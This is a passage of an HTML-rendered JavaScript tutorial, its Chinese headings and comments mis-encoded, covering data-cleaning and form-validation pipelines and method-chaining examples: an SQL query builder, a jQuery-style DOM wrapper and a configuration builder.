      <span class="hljs-keyword">const</span> key = <span class="hljs-string">`<span class="hljs-subst">${item.name}</span>-<span class="hljs-subst">${item.value}</span>`</span>;
      <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(key)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      seen.<span class="hljs-title function_">add</span>(key);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    });
  },
  
  <span class="hljs-comment">// 4. æ’åº</span>
  <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> data.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b.<span class="hljs-property">value</span> - a.<span class="hljs-property">value</span>),
  
  <span class="hljs-comment">// 5. é™åˆ¶æ•°é‡</span>
  <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> data.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>)
);

<span class="hljs-comment">// ä½¿ç”¨ç®¡é“</span>
<span class="hljs-keyword">const</span> rawData = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'  John  '</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'100'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Jane'</span>, <span class="hljs-attr">value</span>: <span class="hljs-number">200</span> },
  <span class="hljs-literal">null</span>,
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'100'</span> }, <span class="hljs-comment">// é‡å¤</span>
  { <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'invalid'</span> }
];

<span class="hljs-keyword">const</span> cleanedData = <span class="hljs-title function_">dataCleaningPipeline</span>(rawData);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Cleaned data:'</span>, cleanedData);
</code></pre>
<h5 data-id="heading-9">2.3 è¡¨å•éªŒè¯ç®¡é“</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// éªŒè¯è§„åˆ™</span>
<span class="hljs-keyword">const</span> validators = {
  <span class="hljs-attr">required</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> ({
    <span class="hljs-attr">isValid</span>: value != <span class="hljs-literal">null</span> &amp;&amp; value.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">''</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">'This field is required'</span>
  }),
  
  <span class="hljs-attr">minLength</span>: <span class="hljs-function">(<span class="hljs-params">min</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> ({
    <span class="hljs-attr">isValid</span>: value?.<span class="hljs-title function_">toString</span>().<span class="hljs-property">length</span> &gt;= min,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`Minimum length is <span class="hljs-subst">${min}</span> characters`</span>
  }),
  
  <span class="hljs-attr">maxLength</span>: <span class="hljs-function">(<span class="hljs-params">max</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> ({
    <span class="hljs-attr">isValid</span>: value?.<span class="hljs-title function_">toString</span>().<span class="hljs-property">length</span> &lt;= max,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`Maximum length is <span class="hljs-subst">${max}</span> characters`</span>
  }),
  
  <span class="hljs-attr">email</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> ({
    <span class="hljs-attr">isValid</span>: <span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>.<span class="hljs-title function_">test</span>(value),
    <span class="hljs-attr">message</span>: <span class="hljs-string">'Invalid email format'</span>
  }),
  
  <span class="hljs-attr">numeric</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> ({
    <span class="hljs-attr">isValid</span>: !<span class="hljs-built_in">isNaN</span>(<span class="hljs-built_in">parseFloat</span>(value)) &amp;&amp; <span class="hljs-built_in">isFinite</span>(value),
    <span class="hljs-attr">message</span>: <span class="hljs-string">'Must be a number'</span>
  })
};

<span class="hljs-comment">// è¡¨å•éªŒè¯ç®¡é“</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FormValidator</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">rules</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span> = rules;
  }

  <span class="hljs-title function_">validate</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-keyword">const</span> errors = {};
    <span class="hljs-keyword">const</span> results = {};

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [field, fieldRules] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>)) {
      <span class="hljs-keyword">const</span> value = data[field];
      <span class="hljs-keyword">const</span> fieldErrors = [];

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> rule <span class="hljs-keyword">of</span> fieldRules) {
        <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">rule</span>(value);
        <span class="hljs-keyword">if</span> (!result.<span class="hljs-property">isValid</span>) {
          fieldErrors.<span class="hljs-title function_">push</span>(result.<span class="hljs-property">message</span>);
        }
      }

      <span class="hljs-keyword">if</span> (fieldErrors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        errors[field] = fieldErrors;
      } <span class="hljs-keyword">else</span> {
        results[field] = value;
      }
    }

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">isValid</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(errors).<span class="hljs-property">length</span> === <span class="hljs-number">0</span>,
      errors,
      results
    };
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> registrationRules = {
  <span class="hljs-attr">username</span>: [
    validators.<span class="hljs-property">required</span>,
    validators.<span class="hljs-title function_">minLength</span>(<span class="hljs-number">3</span>),
    validators.<span class="hljs-title function_">maxLength</span>(<span class="hljs-number">20</span>)
  ],
  <span class="hljs-attr">email</span>: [
    validators.<span class="hljs-property">required</span>,
    validators.<span class="hljs-property">email</span>
  ],
  <span class="hljs-attr">age</span>: [
    validators.<span class="hljs-property">required</span>,
    validators.<span class="hljs-property">numeric</span>,
    <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> ({
      <span class="hljs-attr">isValid</span>: value &gt;= <span class="hljs-number">18</span> &amp;&amp; value &lt;= <span class="hljs-number">100</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">'Age must be between 18 and 100'</span>
    })
  ]
};

<span class="hljs-keyword">const</span> validator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormValidator</span>(registrationRules);
<span class="hljs-keyword">const</span> userData = {
  <span class="hljs-attr">username</span>: <span class="hljs-string">'johndoe'</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">'john@example.com'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};

<span class="hljs-keyword">const</span> validationResult = validator.<span class="hljs-title function_">validate</span>(userData);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Validation result:'</span>, validationResult);
</code></pre>
<h4 data-id="heading-10">ä¸‰ã€é“¾å¼è°ƒç”¨ï¼ˆChaining Patternï¼‰</h4>
<p>é“¾å¼è°ƒç”¨é€šè¿‡è¿”å›å¯¹è±¡å®ä¾‹æœ¬èº«(<code>this</code>), å…è®¸è¿ç»­è°ƒç”¨å¤šä¸ªæ–¹æ³•, ä½¿ä»£ç æ›´åŠ æµç•…æ˜“è¯»ã€‚</p>
<h5 data-id="heading-11">3.1 åŸºç¡€é“¾å¼è°ƒç”¨</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// jQueryé£æ ¼çš„é“¾å¼è°ƒç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">QueryBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span> = {
      <span class="hljs-attr">select</span>: [],
      <span class="hljs-attr">from</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">where</span>: [],
      <span class="hljs-attr">orderBy</span>: [],
      <span class="hljs-attr">limit</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">offset</span>: <span class="hljs-literal">null</span>
    };
  }

  <span class="hljs-title function_">select</span>(<span class="hljs-params">...fields</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">select</span>.<span class="hljs-title function_">push</span>(...fields);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">from</span>(<span class="hljs-params">table</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">from</span> = table;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">where</span>(<span class="hljs-params">condition</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">where</span>.<span class="hljs-title function_">push</span>(condition);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">orderBy</span>(<span class="hljs-params">field, direction = <span class="hljs-string">'ASC'</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">orderBy</span>.<span class="hljs-title function_">push</span>({ field, direction });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">limit</span>(<span class="hljs-params">count</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">limit</span> = count;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">offset</span>(<span class="hljs-params">count</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>.<span class="hljs-property">offset</span> = count;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { select, <span class="hljs-keyword">from</span>, where, orderBy, limit, offset } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span>;
    
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">from</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'FROM clause is required'</span>);
    }

    <span class="hljs-keyword">let</span> sql = <span class="hljs-string">`SELECT <span class="hljs-subst">${select.length &gt; <span class="hljs-number">0</span> ? select.join(<span class="hljs-string">', '</span>) : <span class="hljs-string">'*'</span>}</span> FROM <span class="hljs-subst">${<span class="hljs-keyword">from</span>}</span>`</span>;
    
    <span class="hljs-keyword">if</span> (where.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      sql += <span class="hljs-string">` WHERE <span class="hljs-subst">${where.join(<span class="hljs-string">' AND '</span>)}</span>`</span>;
    }
    
    <span class="hljs-keyword">if</span> (orderBy.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">const</span> orderClauses = orderBy.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">{ field, direction }</span>) =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">${field}</span> <span class="hljs-subst">${direction}</span>`</span>);
      sql += <span class="hljs-string">` ORDER BY <span class="hljs-subst">${orderClauses.join(<span class="hljs-string">', '</span>)}</span>`</span>;
    }
    
    <span class="hljs-keyword">if</span> (limit !== <span class="hljs-literal">null</span>) {
      sql += <span class="hljs-string">` LIMIT <span class="hljs-subst">${limit}</span>`</span>;
    }
    
    <span class="hljs-keyword">if</span> (offset !== <span class="hljs-literal">null</span>) {
      sql += <span class="hljs-string">` OFFSET <span class="hljs-subst">${offset}</span>`</span>;
    }
    
    <span class="hljs-keyword">return</span> sql + <span class="hljs-string">';'</span>;
  }

  <span class="hljs-title function_">reset</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">query</span> = {
      <span class="hljs-attr">select</span>: [],
      <span class="hljs-attr">from</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">where</span>: [],
      <span class="hljs-attr">orderBy</span>: [],
      <span class="hljs-attr">limit</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">offset</span>: <span class="hljs-literal">null</span>
    };
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryBuilder</span>()
  .<span class="hljs-title function_">select</span>(<span class="hljs-string">'id'</span>, <span class="hljs-string">'name'</span>, <span class="hljs-string">'email'</span>)
  .<span class="hljs-title function_">from</span>(<span class="hljs-string">'users'</span>)
  .<span class="hljs-title function_">where</span>(<span class="hljs-string">'active = true'</span>)
  .<span class="hljs-title function_">where</span>(<span class="hljs-string">'age &gt;= 18'</span>)
  .<span class="hljs-title function_">orderBy</span>(<span class="hljs-string">'name'</span>, <span class="hljs-string">'ASC'</span>)
  .<span class="hljs-title function_">limit</span>(<span class="hljs-number">10</span>)
  .<span class="hljs-title function_">offset</span>(<span class="hljs-number">0</span>)
  .<span class="hljs-title function_">build</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Generated SQL:'</span>, sql);
</code></pre>
<h5 data-id="heading-12">3.2 DOMæ“ä½œé“¾å¼è°ƒç”¨</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DOMElement</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">selector</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> selector === <span class="hljs-string">'string'</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span> = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(selector));
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (selector <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Element</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span> = [selector];
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(selector)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span> = selector;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span> = [];
    }
  }

  <span class="hljs-comment">// CSSç›¸å…³æ–¹æ³•</span>
  <span class="hljs-title function_">css</span>(<span class="hljs-params">property, value</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> property === <span class="hljs-string">'object'</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">style</span>, property);
      });
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
        el.<span class="hljs-property">style</span>[property] = value;
      });
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addClass</span>(<span class="hljs-params">className</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(className);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">removeClass</span>(<span class="hljs-params">className</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(className);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">toggleClass</span>(<span class="hljs-params">className</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">toggle</span>(className);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// å†…å®¹æ“ä½œ</span>
  <span class="hljs-title function_">text</span>(<span class="hljs-params">content</span>) {
    <span class="hljs-keyword">if</span> (content !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
        el.<span class="hljs-property">textContent</span> = content;
      });
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">textContent</span> || <span class="hljs-string">''</span>;
  }

  <span class="hljs-title function_">html</span>(<span class="hljs-params">content</span>) {
    <span class="hljs-keyword">if</span> (content !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
        el.<span class="hljs-property">innerHTML</span> = content;
      });
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">innerHTML</span> || <span class="hljs-string">''</span>;
  }

  <span class="hljs-comment">// å±æ€§æ“ä½œ</span>
  <span class="hljs-title function_">attr</span>(<span class="hljs-params">name, value</span>) {
    <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
        el.<span class="hljs-title function_">setAttribute</span>(name, value);
      });
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>[<span class="hljs-number">0</span>]?.<span class="hljs-title function_">getAttribute</span>(name) || <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">// äº‹ä»¶å¤„ç†</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">event, handler, options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-title function_">addEventListener</span>(event, handler, options);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">off</span>(<span class="hljs-params">event, handler, options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-title function_">removeEventListener</span>(event, handler, options);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// éå†</span>
  <span class="hljs-title function_">each</span>(<span class="hljs-params">callback</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">el, index</span>) =&gt;</span> {
      callback.<span class="hljs-title function_">call</span>(el, index, el);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// æŸ¥æ‰¾å­å…ƒç´ </span>
  <span class="hljs-title function_">find</span>(<span class="hljs-params">selector</span>) {
    <span class="hljs-keyword">const</span> found = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      found.<span class="hljs-title function_">push</span>(...<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(el.<span class="hljs-title function_">querySelectorAll</span>(selector)));
    });
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMElement</span>(found);
  }

  <span class="hljs-comment">// è·å–çˆ¶å…ƒç´ </span>
  <span class="hljs-title function_">parent</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> parents = <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> el.<span class="hljs-property">parentElement</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMElement</span>(parents.<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>));
  }

  <span class="hljs-comment">// æ˜¾ç¤º/éšè—</span>
  <span class="hljs-title function_">show</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">css</span>(<span class="hljs-string">'display'</span>, <span class="hljs-string">''</span>);
  }

  <span class="hljs-title function_">hide</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">css</span>(<span class="hljs-string">'display'</span>, <span class="hljs-string">'none'</span>);
  }

  <span class="hljs-comment">// åŠ¨ç”»</span>
  <span class="hljs-title function_">animate</span>(<span class="hljs-params">properties, duration = <span class="hljs-number">300</span>, easing = <span class="hljs-string">'ease'</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">`all <span class="hljs-subst">${duration}</span>ms <span class="hljs-subst">${easing}</span>`</span>;
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">style</span>, properties);
      
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        el.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">''</span>;
      }, duration);
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-comment">// å‡è®¾HTMLä¸­æœ‰: &lt;div id="myDiv"&gt;Hello&lt;/div&gt;</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">$</span> = (<span class="hljs-params">selector</span>) =&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMElement</span>(selector);

$(<span class="hljs-string">'#myDiv'</span>)
  .<span class="hljs-title function_">css</span>({
    <span class="hljs-attr">color</span>: <span class="hljs-string">'white'</span>,
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'blue'</span>,
    <span class="hljs-attr">padding</span>: <span class="hljs-string">'10px'</span>
  })
  .<span class="hljs-title function_">addClass</span>(<span class="hljs-string">'highlight'</span>)
  .<span class="hljs-title function_">text</span>(<span class="hljs-string">'Hello, World!'</span>)
  .<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    $(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">toggleClass</span>(<span class="hljs-string">'active'</span>);
  })
  .<span class="hljs-title function_">animate</span>({
    <span class="hljs-attr">opacity</span>: <span class="hljs-number">0.8</span>,
    <span class="hljs-attr">transform</span>: <span class="hljs-string">'scale(1.1)'</span>
  }, <span class="hljs-number">300</span>);
</code></pre>
<h5 data-id="heading-13">3.3 æ„å»ºå™¨æ¨¡å¼ä¸é“¾å¼è°ƒç”¨</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é…ç½®å¯¹è±¡æ„å»ºå™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">api</span>: {},
      <span class="hljs-attr">ui</span>: {},
      <span class="hljs-attr">features</span>: {},
      <span class="hljs-attr">performance</span>: {}
    };
  }

  <span class="hljs-comment">// APIé…ç½®</span>
  <span class="hljs-title function_">withApi</span>(<span class="hljs-params">baseUrl</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">api</span>.<span class="hljs-property">baseUrl</span> = baseUrl;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">withApiVersion</span>(<span class="hljs-params">version</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">api</span>.<span class="hljs-property">version</span> = version;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">withTimeout</span>(<span class="hljs-params">ms</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">api</span>.<span class="hljs-property">timeout</span> = ms;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// UIé…ç½®</span>
  <span class="hljs-title function_">withTheme</span>(<span class="hljs-params">theme</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">ui</span>.<span class="hljs-property">theme</span> = theme;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">withLanguage</span>(<span class="hljs-params">lang</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">ui</span>.<span class="hljs-property">language</span> = lang;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">withDarkMode</span>(<span class="hljs-params">enabled</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">ui</span>.<span class="hljs-property">darkMode</span> = enabled;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// åŠŸèƒ½é…ç½®</span>
  <span class="hljs-title function_">enableFeature</span>(<span class="hljs-params">feature</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">features</span>[feature] = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">disableFeature</span>(<span class="hljs-params">feature</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">features</span>[feature] = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// æ€§èƒ½é…ç½®</span>
  <span class="hljs-title function_">withCache</span>(<span class="hljs-params">enabled</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">cache</span> = enabled;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">withLazyLoad</span>(<span class="hljs-params">enabled</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">lazyLoad</span> = enabled;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">withCompression</span>(<span class="hljs-params">enabled</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">compression</span> = enabled;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// æ„å»ºæ–¹æ³•</span>
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// éªŒè¯é…ç½®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validate</span>();
    <span class="hljs-comment">// è¿”å›ä¸å¯å˜é…ç½®</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>)));
  }

